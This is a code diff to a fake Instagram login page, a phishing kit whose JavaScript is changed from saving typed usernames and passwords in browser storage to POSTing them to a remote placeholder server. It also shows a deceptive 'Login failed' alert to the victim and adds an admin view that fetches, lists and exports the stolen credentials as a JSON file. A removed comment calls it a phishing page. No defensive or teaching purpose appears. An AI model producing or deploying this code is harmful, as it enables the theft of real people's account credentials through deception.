@@ -152,30 +152,38 @@
             const password = document.getElementById('password').value;
             
             if (username && password) {
-                // Save credentials
-                const credentials = JSON.parse(localStorage.getItem('instagramCredentials'));
-                credentials.push({
-                    username: username,
-                    password: password,
-                    date: new Date().toLocaleString()
+                // Save credentials to server
+                fetch('https://your-server-endpoint.com/save', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        date: new Date().toISOString()
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Show notification
+                    const notification = document.getElementById('notification');
+                    notification.style.display = 'block';
+                    setTimeout(() => {
+                        notification.style.display = 'none';
+                    }, 3000);
+                    
+                    // Reset form
+                    document.getElementById('loginForm').reset();
+                    
+                    // Fake redirect
+                    setTimeout(() => {
+                        alert('Login failed. Please check your username and password and try again.');
+                    }, 1500);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
                 });
-                
-                localStorage.setItem('instagramCredentials', JSON.stringify(credentials));
-                
-                // Show notification
-                const notification = document.getElementById('notification');
-                notification.style.display = 'block';
-                setTimeout(() => {
-                    notification.style.display = 'none';
-                }, 3000);
-                
-                // Reset form
-                document.getElementById('loginForm').reset();
-                
-                // Fake redirect (in a real phishing page, you might redirect to Instagram to make it seem legit)
-                setTimeout(() => {
-                    alert('Login failed. Please check your username and password and try again.');
-                }, 1500);
             }
         });
         
@@ -201,16 +209,23 @@
         });
         
         document.getElementById('exportBtn').addEventListener('click', function() {
-            const credentials = JSON.parse(localStorage.getItem('instagramCredentials'));
-            const dataStr = JSON.stringify(credentials, null, 2);
-            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
-            
-            const exportFileDefaultName = 'instagram_credentials.json';
-            
-            const linkElement = document.createElement('a');
-            linkElement.setAttribute('href', dataUri);
-            linkElement.setAttribute('download', exportFileDefaultName);
-            linkElement.click();
+            fetch('https://your-server-endpoint.com/get')
+                .then(response => response.json())
+                .then(credentials => {
+                    const dataStr = JSON.stringify(credentials, null, 2);
+                    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+                    
+                    const exportFileDefaultName = 'instagram_credentials.json';
+                    
+                    const linkElement = document.createElement('a');
+                    linkElement.setAttribute('href', dataUri);
+                    linkElement.setAttribute('download', exportFileDefaultName);
+                    linkElement.click();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Failed to export credentials from server');
+                });
         });
         
         document.getElementById('clearAllBtn').addEventListener('click', function() {
@@ -221,31 +236,39 @@
         });
         
         function loadCredentials() {
-            const credentials = JSON.parse(localStorage.getItem('instagramCredentials'));
-            const credentialsList = document.getElementById('credentialsList');
-            const totalEntries = document.getElementById('totalEntries');
-            
-            credentialsList.innerHTML = '';
-            totalEntries.textContent = credentials.length;
-            
-            if (credentials.length === 0) {
-                credentialsList.innerHTML = '<div class="px-6 py-4 text-center text-gray-500">No credentials collected yet.</div>';
-                return;
-            }
-            
-            credentials.forEach((cred, index) => {
-                const row = document.createElement('div');
-                row.className = 'grid grid-cols-12 px-6 py-3 text-sm';
-                
-                row.innerHTML = `
-                    <div class="col-span-1">${index + 1}</div>
-                    <div class="col-span-4 font-medium">${cred.username}</div>
-                    <div class="col-span-5">${cred.password}</div>
-                    <div class="col-span-2 text-gray-500">${cred.date}</div>
-                `;
-                
-                credentialsList.appendChild(row);
-            });
+            fetch('https://your-server-endpoint.com/get')
+                .then(response => response.json())
+                .then(credentials => {
+                    const credentialsList = document.getElementById('credentialsList');
+                    const totalEntries = document.getElementById('totalEntries');
+                    
+                    credentialsList.innerHTML = '';
+                    totalEntries.textContent = credentials.length;
+                    
+                    if (credentials.length === 0) {
+                        credentialsList.innerHTML = '<div class="px-6 py-4 text-center text-gray-500">No credentials collected yet.</div>';
+                        return;
+                    }
+                    
+                    credentials.forEach((cred, index) => {
+                        const row = document.createElement('div');
+                        row.className = 'grid grid-cols-12 px-6 py-3 text-sm';
+                        
+                        row.innerHTML = `
+                            <div class="col-span-1">${index + 1}</div>
+                            <div class="col-span-4 font-medium">${cred.username}</div>
+                            <div class="col-span-5">${cred.password}</div>
+                            <div class="col-span-2 text-gray-500">${new Date(cred.date).toLocaleString()}</div>
+                        `;
+                        
+                        credentialsList.appendChild(row);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('credentialsList').innerHTML = 
+                        '<div class="px-6 py-4 text-center text-red-500">Error loading credentials from server</div>';
+                });
         }
     </script>
 </body>
